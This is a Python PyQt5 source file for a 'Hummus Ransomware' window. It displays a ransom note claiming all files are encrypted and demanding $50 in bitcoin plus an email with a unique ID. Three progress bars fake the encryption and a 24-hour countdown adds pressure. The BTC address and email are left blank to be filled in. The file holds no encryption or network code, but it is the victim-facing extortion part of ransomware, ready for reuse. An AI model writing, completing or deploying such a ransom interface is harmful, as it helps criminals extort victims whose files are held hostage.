import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget, QProgressBar
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import Qt, QTimer, QObject, pyqtSignal, QThread

class Worker(QObject):
    progress_updated_1 = pyqtSignal(int)
    progress_updated_2 = pyqtSignal(int)
    progress_updated_3 = pyqtSignal(int)

    def run(self):
        # Simulate encryption progress for the first progress bar
        for i in range(101):
            self.progress_updated_1.emit(i)
            QThread.msleep(100)  # Simulate work (sleep for 100 milliseconds)

        # Simulate progress for the second progress bar
        for j in range(101):
            self.progress_updated_2.emit(j)
            QThread.msleep(100)

        # Simulate progress for the third progress bar
        for k in range(101):
            self.progress_updated_3.emit(k)
            QThread.msleep(100)

class RansomwareGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        # Initialize global variables
        self.btcAdd = ""
        self.email = ""

        # Define ransom note
        self.ransomNote = f"""
        All Your Files Have Been Encrypted\n
        At the end of the day we just want to get paid\n
        Here are the instructions to get getting your files back\n
        1. Pay $50 btc to the listed address\n
        2. Send an email and include your unique id\n
        3. Wait\n
        ------------------------------------\n
        Check your desktop for readme.txt if you are lost!\n
        ------------------------------------\n
        BTC Address: {self.btcAdd}\n
        Email: {self.email}\n
        ------------------------------------\n
        """

        # Set up the GUI
        self.initUI()

        # Start encryption progress and decryption countdown
        self.startEncryptionProgress()
        self.startDecryptionCountdown()

    def initUI(self):
        # Create central widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        # Create layout
        self.layout = QVBoxLayout(central_widget)

        # Set the background color of the central widget to black
        central_widget.setStyleSheet("background-color: #000000;")

        # Add Hummus Ransomware banner box
        banner_label = QLabel("Hummus Ransomware", self)
        banner_label.setAlignment(Qt.AlignCenter)
        banner_label.setStyleSheet("""
            QLabel{
                background-color: #d50000;
                color: #000;  /* Black font color */
                border: 2px solid #ff5131;
                border-radius: 7.5px;
                font-family: 'Segoe UI', sans-serif;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                margin-bottom: 20px;
            }
        """)
        self.layout.addWidget(banner_label)

        # Add stylish ransom note label with a red block background
        self.ransom_note_label = QLabel(self.ransomNote)
        self.ransom_note_label.setAlignment(Qt.AlignCenter)
        self.ransom_note_label.setStyleSheet("""
            QLabel{
                color: #000;  /* Black font color */
                font-family: 'Segoe UI', sans-serif;
                font-size: 14px;
                font-weight: bold;  /* Bold font */
                background-color: #d50000;  /* Red block background */
                padding: 20px;
                border-radius: 7.5px;
                margin: 20px 0;
            }
        """)
        self.layout.addWidget(self.ransom_note_label)

        # Add encryption progress bars
        self.progress_bars = [QProgressBar(self) for _ in range(3)]
        for progress_bar in self.progress_bars:
            self.layout.addWidget(progress_bar)

        # Add continue button with hover effect
        continue_button = QPushButton('Continue', self)
        continue_button.setStyleSheet("""
            QPushButton{
                background-color: #d50000;
                border-radius: 7.5px;
                font-weight: 1200;
                font-size: 18px;
                color: #000;  /* Black font color */
            }
            QPushButton:hover {
                background-color: #9b0000;
            }
        """)
        self.layout.addWidget(continue_button)
        continue_button.clicked.connect(self.hide)

        # Set up window properties
        self.setGeometry(100, 100, 800, 600)
        self.setWindowTitle('Ransomware GUI')
        # Replace with your icon path
        self.setWindowIcon(QIcon('path/to/icon.png'))

        self.show()

    def startEncryptionProgress(self):
        # Create a worker thread
        self.worker_thread = QThread()

        # Move the worker object to the thread
        self.worker = Worker()
        self.worker.moveToThread(self.worker_thread)

        # Connect signals between the worker and GUI
        self.worker.progress_updated_1.connect(self.updateEncryptionProgress1)
        self.worker.progress_updated_2.connect(self.updateEncryptionProgress2)
        self.worker.progress_updated_3.connect(self.updateEncryptionProgress3)

        # Start the thread
        self.worker_thread.started.connect(self.worker.run)
        self.worker_thread.start()

    def updateEncryptionProgress1(self, value):
        # Update the first progress bar
        self.progress_bars[0].setValue(value)

    def updateEncryptionProgress2(self, value):
        # Update the second progress bar
        self.progress_bars[1].setValue(value)

    def updateEncryptionProgress3(self, value):
        # Update the third progress bar
        self.progress_bars[2].setValue(value)

    def startDecryptionCountdown(self):
        self.decryption_timer = QTimer(self)
        self.decryption_timer.timeout.connect(self.updateDecryptionCountdown)
        self.decryption_timer.start(1000)  # Update countdown every second
        self.decryption_time_remaining = 86400  # 24 hours in seconds

    def updateDecryptionCountdown(self):
        # Implement your logic to update the decryption countdown
        # For example, decrease the remaining time and update the label
        self.decryption_time_remaining -= 1
        hours, remainder = divmod(self.decryption_time_remaining, 3600)
        minutes, seconds = divmod(remainder, 60)
        countdown_str = f"Decryption Countdown: {hours:02}:{minutes:02}:{seconds:02}"
        self.ransom_note_label.setText(self.ransomNote + "\n" + countdown_str)

    def closeEvent(self, event):
        # Clean up and stop the worker thread when the GUI is closed
        self.worker_thread.quit()
        self.worker_thread.wait()
        event.accept()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    gui = RansomwareGUI()
    sys.exit(app.exec_())
